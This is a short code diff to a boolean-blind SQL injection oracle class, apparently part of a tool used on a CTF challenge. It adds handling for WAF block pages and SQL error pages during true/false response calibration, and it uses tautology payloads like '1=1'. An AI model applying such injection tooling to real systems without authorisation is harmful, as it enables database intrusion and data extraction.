@@ -276,6 +276,11 @@ class BoolOracle(BaseOracle):
                 true_c, false_c = "1=1", "1=2"
             r_true = self.s.request_value(self.b.wrap(fn(true_c)))
             r_false = self.s.request_value(self.b.wrap(fn(false_c)))
+            # 两态都是拦截页时不能当参照：拦截页会回显 payload，两态文本
+            # 天然不同 → 相似度判不出"假差异"，选错 joiner 会让 eval 恒真
+            # （Hack World 实测：or 被拦时全真，提取出一串 '~'）
+            if r_true.has_waf_block() or r_false.has_waf_block():
+                continue
             if similarity(r_true, r_false) > 0.995:
                 continue
             self.R_true, self.R_false = r_true, r_false
@@ -292,6 +297,10 @@ class BoolOracle(BaseOracle):
         self.requests += 1
         if r.status_code < 0:
             raise OracleError("请求失败")
+        if r.has_sql_error():
+            # 表达式本身无法求值（表/列不存在、语法被破坏）：报错页既非真
+            # 也非假，必须早失败——否则会被相似度误判成恒真，产出 1024 兜底垃圾
+            raise OracleError(f"SQL 报错（表达式无法求值）: {payload[:80]}")
         sim_t = similarity(r, self.R_true)
         sim_f = similarity(r, self.R_false)
         if max(sim_t, sim_f) < 0.90:
